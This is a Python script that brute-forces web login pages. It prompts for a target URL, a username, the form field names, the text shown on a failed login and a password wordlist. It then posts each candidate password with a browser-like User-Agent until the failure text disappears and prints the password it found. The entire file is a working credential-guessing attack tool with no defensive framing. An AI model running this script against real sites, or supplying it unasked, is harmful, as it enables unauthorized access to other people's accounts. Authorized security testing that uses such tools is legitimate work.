import  requests
from hashcraker import bolne
# you can give the value which is used in login page form name given to username to here var name



def details():
    print("Enter the login page url to brutforce:")
    bolne("Enter the login page url to brutforce:")
  
    url=input().strip()
    print("Enter the username to brutforce:")
    bolne("Enter the username to brutforce:")
 
    username=input().strip()
    print("Enter the name of the username field in the form:")
    bolne("Enter the name of the username field in the form:")
    
    name=input().strip()
    print("Enter the name of the password field in the form:")
    bolne("Enter the name of the password field in the form:")
    
    name1=input().strip()
    print("Enter tthe text which is shown in incorect password:")
    bolne("Enter the text which is shown in incorrect password:")
    
    text=input().strip()
    print("ENter the password file location:")
    bolne("Enter the password file location:")
    
    loc=input().strip()
    
    return url, username, name, name1, text, loc

def brutforce(url, username, name, name1, text,loc):
    try:
        with open(loc,"r") as file:
            passwords= file.readlines()
            for password in passwords:
                password = password.strip()
                print(f"[+] Trying password: {password}")
                data={
                    name: username,
                    name1: password
                }
                headers = {
                    "User-Agent": "Mozilla/5.0"
                }

                response = requests.post(url, data=data, headers=headers)
                
                if text not in response.text:
                    print(f"Password found: {password}")
                    bolne(f"Password found: {password}")
                    return
                
                
            print("Password not found in the wordlist.")


    
    except Exception as e:
        print(f"Error reading file: {e}")

def main():
    url,username,name,name1,text,loc=details()
    print("Brutforcing the password...")
    bolne("Brutforcing the password...")
    brutforce(url, username, name, name1, text,loc)

if __name__ == "__main__":
    main()
